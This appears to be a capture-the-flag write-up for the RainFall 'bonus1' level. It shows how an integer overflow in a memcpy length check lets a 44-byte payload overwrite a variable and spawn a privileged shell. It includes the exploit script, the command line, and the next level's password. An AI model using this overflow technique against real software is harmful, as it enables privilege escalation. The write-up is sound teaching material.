# bonus1

Running the binary doesn't seem to do anything, however it's checking its arguments, if none are provided, the program segfaults.

```sh
$ ./bonus1 qwe
$ ./bonus1
Segmentation fault (core dumped)
```

After putting the program in `ghidra` we can see that the `main` function looks like this :


```c
int main(int argc, char **argv)
{
  int returnCode;
  char buffer[40];
  
  returnCode = atoi(argv[1]);
  if (returnCode < 10) {
    memcpy(buffer, argv[2], returnCode * 4);
    if (returnCode == 1464814662) {
      execl("/bin/sh","sh",0);
    }
    returnCode = 0;
  }
  else {
    returnCode = 1;
  }
  return returnCode;
}
```

The prototype of `memcpy` is :

```c
void *memcpy(void *dest, const void *src, size_t n);
```

So, our binary copies into the buffer, `returnCode * 4` bytes of `argv[2]`

However, `returnCode` has to be less than 10, so we can't overflow the buffer.

Since the return code is stored into a `int` (4 bytes), its maximum value can be 2147483647, and its minimal value can be -2147483648.

Thus allowing us to underflow the number of bytes copied into the buffer.

As you can see, `size_t` is used here, it's a type that is used to store unsigned numbers on 32 bits long on x86, and 64 bits long on x86_64.

Using `ltrace` we can se what `n` is when passed to `memcpy`.

```sh
$ ltrace ./bonus1 9 AAAAAAAAAAAAAAAAAA
memcpy(0xbffff6a4, "qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq"..., 36)
```

And indeed, 9 * 4 is 36.

Tinkering a bit with `atoi` :

```sh
$ ltrace ./bonus1 0 AAAAAAAAAAAAAAAAAA
memcpy(0xbffff6a4, "", 0) # no bytes are copied
$ ltrace ./bonus1 -1 AAAAAAAAAAAAAAAAAA
memcpy(0xbffff704, "AAAAAAAAAAAAAAAAAA", 4294967292); # successful underflow
# Passing in INT_MIN+1 :
$ ltrace ./bonus1 -2147483647 AAAAAAAAAAAAAAAAAA
memcpy(0xbffff694, "qqqq", 4) # 4 bytes are copied
```

So it indeeds underflows, but we're interested in the value of `returnCode` when it's equal to `1464814662`.

```sh
$ echo '-2147483649-(2147483647-1464814662)' | bc
-2830152634
```

This magic number will underflow to `1464814662` when passed to a 4 bytes integer, but the problem is that `if (returnCode < 10)` is no longer true.

But we still can use this trick to force `memcpy` to copy more than 40 bytes into the buffer, and overwrite the value of `returnCode`.

To do that we have to overflow the 32-bit integer.

We want to write 44 bytes to our buffer, 11 * 4 is 44.

```py
>>> -2147483648 + 11
-2147483637
```

This will allow us to copy 44 bytes. So we just have to pad 40 bytes, and then write `1464814662` (0x574f4c46) in little endian :

```py
import struct
payload = "A" * 40 + struct.pack("<I", 0x574f4c46)
print payload + "\x00"
```

```sh
bonus1@RainFall:~$ ./bonus1 -2147483637 $(python /tmp/pwn.py)
$ id
uid=2011(bonus1) gid=2011(bonus1) euid=2012(bonus2) egid=100(users) groups=2012(bonus2),100(users),2011(bonus1)
cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```